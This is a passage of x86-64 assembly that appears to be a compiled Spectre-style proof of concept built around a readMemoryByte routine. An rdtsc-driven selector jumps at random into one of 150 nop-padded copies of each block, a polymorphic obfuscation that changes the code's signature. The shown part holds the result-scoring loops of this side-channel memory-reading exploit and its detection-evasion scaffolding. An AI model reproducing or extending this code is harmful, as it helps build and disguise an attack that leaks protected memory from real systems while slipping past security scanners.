	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 141
.LreadMemoryByte_win3_var141:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 142
.LreadMemoryByte_win3_var142:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 143
.LreadMemoryByte_win3_var143:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 144
.LreadMemoryByte_win3_var144:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 145
.LreadMemoryByte_win3_var145:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 146
.LreadMemoryByte_win3_var146:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	nop
	nop
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 147
.LreadMemoryByte_win3_var147:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 148
.LreadMemoryByte_win3_var148:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win3_continue
## Variant 149
.LreadMemoryByte_win3_var149:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
.LreadMemoryByte_win3_continue:
	movl	%edx, (%rax,%rcx,4)
LBB1_23:                                ##   in Loop: Header=BB1_19 Depth=2
	jmp	LBB1_24
LBB1_24:                                ##   in Loop: Header=BB1_19 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_19
LBB1_25:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	$-1, -64(%rbp)
	movl	$-1, -60(%rbp)
	movl	$0, -56(%rbp)
LBB1_26:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win2_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win2_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win2_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win2_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win2_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win2_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win2_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win2_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win2_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win2_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win2_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win2_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win2_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win2_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win2_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win2_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win2_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win2_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win2_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win2_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win2_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win2_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win2_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win2_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win2_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win2_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win2_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win2_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win2_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win2_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win2_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win2_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win2_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win2_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win2_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win2_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win2_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win2_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win2_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win2_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win2_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win2_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win2_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win2_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win2_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win2_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win2_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win2_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win2_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win2_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win2_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win2_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win2_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win2_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win2_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win2_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win2_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win2_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win2_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win2_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win2_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win2_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win2_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win2_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win2_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win2_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win2_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win2_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win2_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win2_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win2_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win2_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win2_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win2_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win2_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win2_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win2_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win2_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win2_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win2_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win2_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win2_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win2_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win2_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win2_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win2_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win2_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win2_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win2_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win2_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win2_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win2_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win2_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win2_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win2_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win2_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win2_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win2_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win2_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win2_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win2_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win2_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win2_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win2_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win2_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win2_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win2_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win2_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win2_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win2_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win2_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win2_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win2_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win2_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win2_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win2_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win2_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win2_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win2_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win2_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win2_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win2_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win2_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win2_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win2_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win2_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win2_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win2_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win2_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win2_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win2_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win2_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win2_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win2_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win2_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win2_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win2_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win2_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win2_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win2_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win2_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win2_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win2_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win2_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win2_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win2_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win2_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win2_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win2_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win2_var149
	jmp	.LreadMemoryByte_win2_var0
## Variant 0
.LreadMemoryByte_win2_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 1
.LreadMemoryByte_win2_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 2
.LreadMemoryByte_win2_var2:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 3
.LreadMemoryByte_win2_var3:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 4
.LreadMemoryByte_win2_var4:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 5
.LreadMemoryByte_win2_var5:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 6
.LreadMemoryByte_win2_var6:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 7
.LreadMemoryByte_win2_var7:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 8
.LreadMemoryByte_win2_var8:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 9
.LreadMemoryByte_win2_var9:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 10
.LreadMemoryByte_win2_var10:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 11
.LreadMemoryByte_win2_var11:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 12
.LreadMemoryByte_win2_var12:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 13
.LreadMemoryByte_win2_var13:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 14
.LreadMemoryByte_win2_var14:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 15
.LreadMemoryByte_win2_var15:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 16
.LreadMemoryByte_win2_var16:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 17
.LreadMemoryByte_win2_var17:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 18
.LreadMemoryByte_win2_var18:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 19
.LreadMemoryByte_win2_var19:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 20
.LreadMemoryByte_win2_var20:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 21
.LreadMemoryByte_win2_var21:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 22
.LreadMemoryByte_win2_var22:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 23
.LreadMemoryByte_win2_var23:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 24
.LreadMemoryByte_win2_var24:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 25
.LreadMemoryByte_win2_var25:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 26
.LreadMemoryByte_win2_var26:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 27
.LreadMemoryByte_win2_var27:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 28
.LreadMemoryByte_win2_var28:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 29
.LreadMemoryByte_win2_var29:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 30
.LreadMemoryByte_win2_var30:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 31
.LreadMemoryByte_win2_var31:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
